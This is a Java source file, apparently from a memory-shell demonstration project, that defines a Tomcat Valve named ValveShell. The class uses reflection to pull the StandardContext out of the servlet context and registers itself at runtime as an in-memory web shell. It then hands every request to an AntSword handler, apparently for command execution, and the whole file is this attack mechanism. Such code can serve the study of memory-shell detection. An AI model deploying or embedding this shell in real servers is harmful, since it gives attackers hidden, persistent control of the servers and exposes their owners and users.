package com.spkiddai.memoryserver.Shell;

import com.spkiddai.memoryserver.Tools.AntSwordTool;
import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;


public class ValveShell extends ValveBase {

    // Valve的核心方法，用于处理请求
    public void invoke(Request request, Response response) throws IOException, ServletException {
        AntSwordTool antswordUtil = new AntSwordTool();
        antswordUtil.exec(request,response);
        this.getNext().invoke(request, response);
    }

    /**
     * 向Tomcat注册Valve
     *
     * @param request 当前的HttpServletRequest请求对象
     */
    public void addValve(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();
        StandardContext context = getContext(servletContext);

        // 创建ValveTest实例
        Valve valvetest = new ValveShell();

        // 添加Valve
        context.addValve(valvetest);
    }

    /**
     * 从ServletContext中获取StandardContext对象
     *
     * @param servletContext Servlet上下文对象
     * @return 返回StandardContext对象
     */
    public static StandardContext getContext(ServletContext servletContext) throws Exception {
        StandardContext context = null;

        while (context == null) {
            Field f = servletContext.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object object = f.get(servletContext);

            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                context = (StandardContext) object;
            }
        }
        return context;
    }
}

